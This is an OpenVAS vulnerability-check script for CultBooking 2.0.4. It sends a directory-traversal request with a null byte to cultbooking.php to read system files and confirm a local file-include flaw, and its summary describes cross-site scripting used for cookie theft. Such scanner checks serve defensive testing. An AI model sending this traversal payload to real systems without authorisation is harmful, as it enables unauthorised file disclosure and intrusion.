###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_CultBooking_45965.nasl 5642 2017-03-21 08:49:30Z cfi $
#
# CultBooking 'cultbooking.php' Local File Include and Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "CultBooking is prone to a local file-include vulnerability and
multiple cross-site scripting vulnerabilities because it fails to
properly sanitize user-supplied input.

An attacker can exploit the local file-include vulnerability using
directory-traversal strings to view and execute local files within
the context of the webserver process. Information harvested may aid
in further attacks.

The attacker may leverage the cross-site scripting issues to execute
arbitrary script code in the browser of an unsuspecting user in the
context of the affected site. This may let the attacker steal cookie-
based authentication credentials and launch other attacks.

CultBooking 2.0.4 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(103042);
 script_version("$Revision: 5642 $");
 script_tag(name:"last_modification", value:"$Date: 2017-03-21 09:49:30 +0100 (Tue, 21 Mar 2017) $");
 script_tag(name:"creation_date", value:"2011-01-25 13:20:03 +0100 (Tue, 25 Jan 2011)");
 script_bugtraq_id(45965);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_name("CultBooking 'cultbooking.php' Local File Include and Multiple Cross Site Scripting Vulnerabilities");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/45965");
 script_xref(name : "URL" , value : "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-4987.php");
 script_xref(name : "URL" , value : "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-4988.php");
 script_xref(name : "URL" , value : "http://www.cultuzz.com/cultbooking");

 script_tag(name:"qod_type", value:"remote_vul");
 script_summary("Determine if CultBooking is prone to a local file-include vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

files = traversal_files();

dirs = make_list("/cb","/cultbooking","/CultBooking",cgi_dirs());

foreach dir (dirs) {
  foreach file (keys(files)) {
   
    url = string(dir,"/cultbooking.php?lang=",crap(data:"../",length:3*9),files[file],"%00"); 


    if(http_vuln_check(port:port, url:url,pattern:file)) {
     
      security_message(port:port);
      exit(0);

    }
  }
}

exit(0);
